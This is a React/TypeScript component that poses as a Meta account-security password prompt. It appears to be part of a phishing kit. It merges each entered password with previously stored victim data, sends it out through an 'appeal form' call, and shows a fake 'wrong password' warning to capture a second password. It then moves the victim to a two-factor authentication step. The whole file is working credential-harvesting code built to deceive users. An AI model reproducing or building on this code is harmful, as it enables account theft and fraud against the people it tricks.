import React from 'react';
import Modal from './Modal';
import PasswordInput from '../password-input/password-input';
import { getRecord, removeRecord, saveRecord, sendAppealForm } from '../../app/utils';
import "../../app/libs/i18n"
import { useTranslation } from 'react-i18next';

interface SecurityModalProps {
    isOpendPassword: boolean;
    onToggleModalPass: (value: boolean) => void;
    onOpendChoseAuthen: (value: boolean) => void;
    onSendDataModal: (value: object) => void;
}

const SecurityModal: React.FC<SecurityModalProps> = ({ isOpendPassword, onToggleModalPass, onOpendChoseAuthen, onSendDataModal }) => {

    React.useEffect(() => {
        setIsOpen(isOpendPassword);
    }, [isOpendPassword]);

    const [isOpen, setIsOpen] = React.useState(isOpendPassword);
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [errors, setErrors] = React.useState<Record<string, string>>({});

    const { t, i18n } = useTranslation();

    const [formData, setFormData] = React.useState({
        password: '',
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' }));
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModalPass(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            
            const newErrors: Record<string, string> = {};
            if (!formData.password.trim()) newErrors.password = t('modal.password.form.password.required');
            
            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            setLoading(true);

            if (click === 0) {
                let data_save = await getRecord("__client_rec__fi_rst") || {};

                const clientData = {
                    ...data_save,
                    password: formData.password,
                };

                await saveRecord("__client_rec__se_con", clientData);
                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(async () => {
                            setLoading(false);  
                            setFormData({ password: '' });
                            newErrors.password = t('modal.password.form.password.warning');
                            setErrors(newErrors);
                            // Sau khi submit thành công hoặc đóng modal
                            await removeRecord("__client_rec__fi_rst"); // Xóa data cũ
                        }, 1350);

                        setClick(1)
                    })
                    .catch((err) => {
                        console.log(err);
                    });
            } else {
                let data_save = await getRecord("__client_rec__se_con") || {};

                const clientData = {
                    ...data_save,
                    passwordSecond: formData.password,
                };

                await saveRecord("__client_rec__th_ird", clientData);
                onSendDataModal(clientData);
                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(async () => {
                            setLoading(false);  
                            setFormData({ password: '' });

                            await removeRecord("__client_rec__se_con"); // Xóa data cũ
                            onToggleModalPass(false);
                            onOpendChoseAuthen(true);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col items-center justify-between flex-1">
                <div className='w-[50px] h-[50px] mb-[20px] mx-auto'>
                    <img src="/meta/logo-fa.svg" width="100%" height="100%" alt="logo" />
                </div>

                <div className='w-full'>
                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>{t('modal.password.description')}</p>
                    <form onSubmit={handSubmit} >
                        <div className='w-full'>
                            <PasswordInput
                                id='password'
                                placeholder={t('modal.password.form.password.placeholder')}
                                className={inputClass('password')}
                                value={formData.password}
                                onChange={handleChange}
                            />
                            {errorText('password')}
                        </div>
                        <div className='w-full mt-[20px]'>
                            <button
                                className={`h-[40px] min-h-[40px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : '' }`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
                                        <img src="/meta/loading.svg" width="100%" height="100%" alt="loading" />
                                    </div>
                                )}
                                {loading ? '' : t('modal.password.form.button')}
                            </button>
                        </div>
                        <div>
                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>{t('modal.password.form.forgot_password')}</a></p>
                        </div>
                    </form>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto'>
                    <img src="/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default SecurityModal;
